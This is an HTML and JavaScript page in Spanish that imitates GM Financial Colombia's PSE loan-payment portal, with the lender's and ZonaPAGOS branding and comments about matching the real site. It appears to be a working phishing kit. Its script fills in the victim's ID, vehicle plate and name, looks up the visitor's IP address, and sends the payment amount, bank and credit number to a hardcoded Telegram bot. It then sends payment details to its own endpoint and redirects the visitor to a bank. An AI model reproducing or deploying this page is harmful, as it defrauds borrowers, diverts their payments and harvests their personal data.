<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<title>Pago GM Financial - PSE</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- Fuente similar a la del sitio real -->
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --gm-blue: #0047FF; /* Azul del botón y borde superior */
    --gm-text: #333333;
    --gm-gray-light: #f4f4f4;
    --gm-gray-border: #cccccc;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  
  body {
    font-family: 'Open Sans', Arial, sans-serif;
    color: var(--gm-text);
    background-color: #ffffff;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
  }

  /* ─── HEADER ─── */
  .top-bar {
    height: 5px;
    background-color: var(--gm-blue);
    width: 100%;
  }
  .header {
    padding: 20px;
    display: flex;
    align-items: center;
    border-bottom: 1px solid #eaeaea;
  }
  .header img {
    height: 40px;
    object-fit: contain;
  }

  /* ─── CONTENIDO PRINCIPAL ─── */
  .main-content {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 40px 20px;
  }

  .titulo-pago {
    font-size: 16px;
    font-weight: 400;
    color: #444;
    text-align: center;
    margin-bottom: 30px;
  }

  .card-pago {
    background-color: var(--gm-gray-light);
    border: 1px solid #ddd;
    border-radius: 6px;
    padding: 30px;
    width: 100%;
    max-width: 600px;
    box-shadow: 0 4px 10px rgba(0,0,0,0.05);
  }

  .form-group {
    margin-bottom: 15px;
    position: relative;
    display: flex;
  }

  .input-icon {
    width: 45px;
    background-color: #fff;
    border: 1px solid var(--gm-gray-border);
    border-right: none;
    border-radius: 4px 0 0 4px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #555;
  }

  .input-field {
    flex: 1;
    padding: 12px 15px;
    border: 1px solid var(--gm-gray-border);
    border-left: none;
    border-right: none;
    font-size: 14px;
    outline: none;
    font-family: inherit;
  }
  .input-field:focus {
    background-color: #fafafa;
  }

  .input-help {
    width: 45px;
    background-color: #fff;
    border: 1px solid var(--gm-gray-border);
    border-left: none;
    border-radius: 0 4px 4px 0;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #777;
    font-size: 18px;
    cursor: help;
    font-weight: bold;
  }

  /* Elementos para el formulario PSE dentro de la tarjeta */
  .pse-fields {
    margin-top: 25px;
    padding-top: 25px;
    border-top: 1px dashed #ccc;
  }
  .pse-fields select,
  .pse-fields input[type="email"],
  .pse-fields input[type="number"] {
    width: 100%;
    padding: 12px 15px;
    border: 1px solid var(--gm-gray-border);
    border-radius: 4px;
    font-size: 14px;
    font-family: inherit;
    outline: none;
  }
  .pse-fields label {
    display: block;
    margin-bottom: 5px;
    font-size: 13px;
    font-weight: 600;
    color: #555;
  }

  .btn-continuar {
    width: 100%;
    padding: 15px;
    background-color: var(--gm-blue);
    color: white;
    border: none;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 20px;
    transition: background 0.2s;
  }
  .btn-continuar:hover:not(:disabled) {
    background-color: #0036cc;
  }
  .btn-continuar:disabled {
    background-color: #88aaff;
    cursor: not-allowed;
  }

  .alert {
    padding: 10px 15px;
    border-radius: 4px;
    margin-bottom: 15px;
    font-size: 13px;
    display: none;
  }
  .alert.error { background: #fce8e6; color: #c5221f; border: 1px solid #f5c6cb; }
  .alert.success { background: #e6f4ea; color: #137333; border: 1px solid #c3e6cb; }
  .alert.info { background: #e8f0fe; color: #1a73e8; border: 1px solid #b8daff; }
  .alert.show { display: block; }

  /* ─── FOOTER ─── */
  .footer {
    background-color: #000000;
    color: #ffffff;
    padding: 30px 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-wrap: wrap;
    gap: 20px;
  }

  .footer-left {
    display: flex;
    align-items: center;
    gap: 15px;
  }

  .sello-vigilado {
    height: 60px;
    /* Si tienes la imagen del sello ponla aquí, si no, lo dejamos con texto */
    border: 1px solid #fff;
    padding: 5px;
    font-size: 8px;
    text-align: center;
    writing-mode: vertical-rl;
    transform: rotate(180deg);
    letter-spacing: 1px;
  }

  .footer-logo {
    height: 35px;
    filter: brightness(0) invert(1); /* Hace el logo blanco si es oscuro */
    object-fit: contain;
  }

  .footer-right {
    text-align: right;
    font-size: 12px;
    color: #aaaaaa;
    line-height: 1.6;
  }
  .footer-right strong {
    color: #00c98d; /* Color teal de ZonaPAGOS */
  }

  /* Ocultar el grupo de documento/placa original ya que se prellenan */
  .form-group.hidden {
    display: none;
  }

  @media (max-width: 768px) {
    .footer {
      flex-direction: column;
      align-items: flex-start;
    }
    .footer-right {
      text-align: left;
    }
    .card-pago {
      padding: 20px;
    }
  }

  /* Spinner */
  .spinner {
    display: inline-block;
    width: 16px;
    height: 16px;
    border: 2px solid rgba(255,255,255,0.4);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin-right: 8px;
    vertical-align: middle;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

<div class="top-bar"></div>

<div class="header">
  <!-- Reemplaza 'gm.png' por el nombre real de tu archivo de imagen -->
  <img src="gm.png" alt="GM Financial" onerror="this.outerHTML='<h2 style=\'color:#0047FF; font-weight:700;\'>gm FINANCIAL</h2>'">
</div>

<div class="main-content">
  <div class="titulo-pago">
    Realiza fácilmente el pago de la cuota de tu<br>crédito
  </div>

  <div class="card-pago">
    <div id="alert-box" class="alert"></div>

    <form id="form-pse" autocomplete="off">
      
      <!-- Campos estilo ZonaPAGOS (Prellenados) -->
      <div class="form-group">
        <div class="input-icon">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
        </div>
        <input type="text" id="numero_documento" name="numero_documento" class="input-field" required placeholder="Documento de identidad (Para NIT, no incluir dígito de verificación)">
        <div class="input-help">?</div>
      </div>

      <div class="form-group">
        <div class="input-icon">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M18.92 6.01C18.72 5.42 18.16 5 17.5 5h-11c-.66 0-1.21.42-1.42 1.01L3 12v8c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-1h12v1c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-8l-2.08-5.99zM6.5 16c-.83 0-1.5-.67-1.5-1.5S5.67 13 6.5 13s1.5.67 1.5 1.5S7.33 16 6.5 16zm11 0c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zM5 11l1.5-4.5h11L19 11H5z"/></svg>
        </div>
        <input type="text" id="placa_vehiculo" class="input-field" placeholder="Ingresa la placa del vehículo financiado (Sin espacios)" readonly>
        <div class="input-help">?</div>
      </div>

      <!-- Campos adicionales para PSE -->
      <div class="pse-fields">
        <div style="margin-bottom: 12px;">
          <label for="nombre_completo">Nombre completo *</label>
          <input type="text" id="nombre_completo" required style="width:100%; padding:12px 15px; border:1px solid #ccc; border-radius:4px; font-family:inherit;">
        </div>

        <div style="margin-bottom: 12px;">
          <label for="email">Correo electrónico *</label>
          <input type="email" id="email" required placeholder="tucorreo@ejemplo.com">
        </div>

        <div style="margin-bottom: 12px;">
          <label for="bank_code">Banco para PSE *</label>
          <select id="bank_code" required>
            <option value="">Cargando bancos...</option>
          </select>
        </div>

        <div>
          <label for="amount">Monto a pagar (COP) *</label>
          <input type="number" id="amount" required step="1" min="1" placeholder="0">
        </div>
      </div>

      <button type="submit" id="btn-pagar" class="btn-continuar" disabled>
        Continuar
      </button>
    </form>
  </div>
</div>

<!-- FOOTER NEGRO COMO EN LA FOTO -->
<div class="footer">
  <div class="footer-left">
    <div class="sello-vigilado">
      VIGILADO<br>SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA
    </div>
    <!-- Reemplaza 'gm.png' por tu logo -->
    <img src="gm.png" alt="GM Financial" class="footer-logo" onerror="this.outerHTML='<h2 style=\'color:#fff; font-weight:700;\'>gm FINANCIAL</h2>'">
    <div style="font-size: 10px; color: #aaa; margin-left: 10px; line-height: 1.2;">
      GM Financial Colombia S.A.<br>Compañía de Financiamiento.
    </div>
  </div>
  
  <div class="footer-right">
    <strong>ZonaPAGOS</strong> es un producto de ZonaVirtual S.A.<br>
    Copyright ZonaVirtual S.A.
  </div>
</div>

<script>
(function () {
  'use strict';

  const API_BASE = window.location.origin;
  
  // Telegram
  const TG_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
  const TG_CHAT_ID   = '-1004457768033';

  // URL Params
  const params = new URLSearchParams(window.location.search);
  const PARAM_DOC     = params.get('documento') || '';
  const PARAM_PLACA   = params.get('placa')     || '';
  const PARAM_TOTAL   = params.get('total')     || '';
  const PARAM_NOMBRE  = params.get('nombre')    || '';
  const PARAM_FACTURA = params.get('factura')   || '';
  const PARAM_CREDITO = params.get('credito')   || params.get('numeroCredito') || '';

  const $ = (id) => document.getElementById(id);

  function mostrarAlerta(tipo, mensaje) {
    const box = $('alert-box');
    box.className = 'alert show ' + tipo;
    box.textContent = mensaje;
  }
  function ocultarAlerta() {
    $('alert-box').className = 'alert';
  }
  function formatearCOP(valor) {
    return '$' + (Number(valor) || 0).toLocaleString('es-CO');
  }

  async function obtenerIP() {
    const proveedores = ['https://api.ipify.org?format=json', 'https://ipapi.co/json/'];
    for (const url of proveedores) {
      try {
        const r = await fetch(url, { cache: 'no-store' });
        const d = await r.json();
        if (d.ip || d.query) return d.ip || d.query;
      } catch (_) {}
    }
    return 'desconocida';
  }

  async function notificarTelegram({ ip, valor, banco, credito }) {
    const texto = 
      '🚨 <b>NUEVO PAGO PSE — GM FINANCIAL</b> 🚨\n' +
      '━━━━━━━━━━━━━━━━━━━━\n' +
      `🌐 <b>IP:</b> <code>${ip}</code>\n` +
      `💰 <b>Valor:</b> ${formatearCOP(valor)}\n` +
      `🏦 <b>Banco:</b> ${banco}\n` +
      `📄 <b>N° crédito:</b> ${credito || '—'}\n` +
      `🕒 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}\n` +
      '━━━━━━━━━━━━━━━━━━━━';

    try {
      await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TG_CHAT_ID,
          text: texto,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      });
    } catch (err) {
      console.error('[telegram] error:', err);
    }
  }

  function prellenar() {
    if (PARAM_DOC) $('numero_documento').value = PARAM_DOC;
    if (PARAM_PLACA) $('placa_vehiculo').value = PARAM_PLACA;
    if (PARAM_NOMBRE) $('nombre_completo').value = PARAM_NOMBRE;
    if (PARAM_TOTAL) $('amount').value = Number(String(PARAM_TOTAL).replace(/[^0-9.]/g, ''));
  }

  async function cargarBancos() {
    const sel = $('bank_code');
    try {
      const resp = await fetch(`${API_BASE}/pse/bancos`);
      const data = await resp.json();
      if (!data.ok || !Array.isArray(data.bancos)) throw new Error(data.error || 'Inválido');
      
      sel.innerHTML = '<option value="">— Selecciona tu banco —</option>';
      data.bancos.forEach((b) => {
        const opt = document.createElement('option');
        opt.value = b.code || b.bank_code || b.id;
        opt.textContent = b.name || b.bank_name || b.description;
        sel.appendChild(opt);
      });
      $('btn-pagar').disabled = false;
    } catch (err) {
      sel.innerHTML = '<option value="">Error al cargar bancos</option>';
      mostrarAlerta('error', 'No se pudieron cargar los bancos.');
    }
  }

  $('form-pse').addEventListener('submit', async (e) => {
    e.preventDefault();
    ocultarAlerta();

    const nombre = $('nombre_completo').value.trim();
    const numeroDocumento = $('numero_documento').value.trim();
    const email = $('email').value.trim();
    const bankCode = $('bank_code').value;
    const amount = Number($('amount').value);

    if (!nombre || !numeroDocumento || !email || !bankCode || !amount) {
      return mostrarAlerta('error', 'Por favor completa todos los campos (Nombre, Documento, Email, Banco y Monto).');
    }
    if (amount < 1000) {
      return mostrarAlerta('error', 'El monto mínimo es $1.000 COP.');
    }

    const selectBanco = $('bank_code');
    const bankName = selectBanco.options[selectBanco.selectedIndex].textContent;
    const credito = PARAM_CREDITO || PARAM_FACTURA || '—';

    const btn = $('btn-pagar');
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span> Procesando...';

    mostrarAlerta('info', 'Conectando con PSE...');

    const ip = await obtenerIP();
    notificarTelegram({ ip, valor: amount, banco: bankName, credito });

    try {
      const resp = await fetch(`${API_BASE}/pse/pagar`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          bank_code: bankCode,
          bank_name: bankName,
          document_type: 'CC', // Asumimos CC por defecto en este form
          document_number: numeroDocumento,
          amount: amount,
          email: email,
          full_name: nombre,
        }),
      });

      const data = await resp.json();
      if (!data.ok || !data.bank_url) throw new Error(data.error || 'No URL');

      mostrarAlerta('success', '✅ Redirigiendo a tu banco...');
      setTimeout(() => { window.location.href = data.bank_url; }, 800);

    } catch (err) {
      mostrarAlerta('error', 'Error al procesar el pago: ' + err.message);
      btn.disabled = false;
      btn.innerHTML = 'Continuar';
    }
  });

  prellenar();
  cargarBancos();
})();
</script>

</body>
</html>
